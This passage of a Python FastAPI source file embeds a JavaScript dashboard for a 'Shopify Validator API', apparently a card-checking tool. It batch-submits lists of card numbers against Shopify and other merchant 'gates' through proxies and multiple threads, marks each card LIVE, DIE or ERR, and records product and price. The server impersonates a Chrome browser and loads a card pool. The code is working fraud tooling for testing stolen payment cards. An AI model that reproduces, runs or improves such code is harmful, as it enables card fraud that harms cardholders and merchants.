            <td>${r.gate}</td>
            <td>${r.product} ($${r.price})</td>
            <td>${r.time}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function processItem(site, card, proxy, endpoint, maxPrice) {
    const url = new URL(endpoint, window.location.origin);
    url.searchParams.append('site', site);
    if (card) url.searchParams.append(endpoint === '/shopify' ? 'cc' : 'card', card);
    if (proxy) url.searchParams.append('proxy', proxy);
    if (maxPrice) url.searchParams.append('max_price', maxPrice);

    try {
        const res = await fetch(url.toString());
        const data = await res.json();
        
        // Determine Status
        let status = 'DIE';
        const respUpper = (data.card_response || data.Response || '').toUpperCase();
        
        if (res.ok && data.valid) {
            status = 'LIVE';
        } else if (!res.ok || data.error || respUpper.includes('ERROR') || respUpper.includes('FAILED') || respUpper.includes('THROTTLED')) {
            status = 'ERR';
        }

        return {
            site: site,
            status: status,
            response: data.card_response || data.Response || data.error || 'Unknown',
            cc_masked: card ? card.substring(0,6)+'****'+card.slice(-4) : '-',
            gate: data.gate || data.Gate || '-',
            product: data.product || data.Product || '-',
            price: data.price || data.Price || '0.00',
            time: data.time || data.Time || '-'
        };
    } catch (e) {
        return {
            site: site,
            status: 'ERR',
            response: 'Network Error',
            cc_masked: '-',
            gate: '-',
            product: '-',
            price: '-',
            time: '-'
        };
    }
}

async function startBatch() {
    if (isRunning) return;
    
    const sitesRaw = document.getElementById('sites').value.trim();
    const cardsRaw = document.getElementById('cards').value.trim();
    const proxy = document.getElementById('proxy').value.trim();
    const endpoint = document.getElementById('endpoint').value;
    const maxPrice = document.getElementById('max_price').value;
    const threads = parseInt(document.getElementById('threads').value);

    if (!sitesRaw) { alert('Enter sites'); return; }

    const sites = sitesRaw.split('\n').map(s => s.trim()).filter(s => s);
    const cards = cardsRaw ? cardsRaw.split('\n').map(c => c.trim()).filter(c => c) : [''];

    isRunning = true;
    stopFlag = false;
    results = [];
    renderTable();
    updateStats();
    
    document.getElementById('btn-start').disabled = true;
    document.getElementById('btn-stop').disabled = false;
    
    startTime = Date.now();
    timerInt = setInterval(() => {
        const sec = Math.floor((Date.now() - startTime) / 1000);
        document.getElementById('s-time').innerText = formatTime(sec);
    }, 1000);

    let taskQueue = [];
    // Pair sites and cards cyclically
    const maxLen = Math.max(sites.length, cards.length);
    for(let i=0; i<maxLen; i++) {
        taskQueue.push({
            site: sites[i % sites.length],
            card: cards[i % cards.length]
        });
    }

    let index = 0;
    async function worker() {
        while(index < taskQueue.length && !stopFlag) {
            const task = taskQueue[index++];
            const res = await processItem(task.site, task.card, proxy, endpoint, maxPrice);
            results.unshift(res); // Add to top
            renderTable();
            updateStats();
        }
    }

    const workers = Array(Math.min(threads, taskQueue.length)).fill(0).map(() => worker());
    await Promise.all(workers);

    clearInterval(timerInt);
    isRunning = false;
    document.getElementById('btn-start').disabled = false;
    document.getElementById('btn-stop').disabled = true;
}

function stopBatch() {
    stopFlag = true;
}
</script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
@app.get("/ui", response_class=HTMLResponse)
async def index_route():
    return HTMLResponse(content=INDEX_HTML)

# ---------------------------------------------------------------------------
# Middleware
# ---------------------------------------------------------------------------
@app.middleware("http")
async def add_timing_and_log(request: Request, call_next):
    from starlette.responses import Response as StarletteResponse
    t0 = time.time()
    resp = await call_next(request)
    elapsed_ms = (time.time() - t0) * 1000
    
    resp.headers["X-Response-Time"] = f"{elapsed_ms:.1f}ms"
    
    # Capture body for logging
    body_chunks = []
    async for chunk in resp.body_iterator:
        body_chunks.append(chunk if isinstance(chunk, bytes) else chunk.encode())
    body = b"".join(body_chunks)
    
    asyncio.create_task(_log_incoming(request, body, resp.status_code, elapsed_ms))
    
    return StarletteResponse(
        content=body,
        status_code=resp.status_code,
        headers=dict(resp.headers),
        media_type=resp.media_type,
    )

# ---------------------------------------------------------------------------
# Lifespan & Init
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session, _site_semaphores
    # Initialize singletons
    _site_semaphores = LRUCacheSemaphores(max_size=1000)
    _shared_session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT))
    _reload_cards()
    log.warning("Shopify Validator API started. Pool hints: %d, Site Concurrency: %d", POOL_SIZE, SITE_CONCURRENCY)
    yield
    if _shared_session:
        await _shared_session.close()
    log.warning("Shopify Validator API stopped.")

app.router.lifespan_context = lifespan

# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"\n{'='*60}\n  Shopify Validator API v3.2 (Rebuilt)\n  Port: {PORT}\n  Workers: {WORKERS}\n{'='*60}\n")
    uvicorn.run(
        "api:app",
        host="0.0.0.0",
        port=PORT,
        workers=WORKERS,
        loop="auto",
        http="auto",
        log_level="warning",
        access_log=False,
        timeout_keep_alive=30,
        limit_concurrency=5000,
        backlog=4096,
)
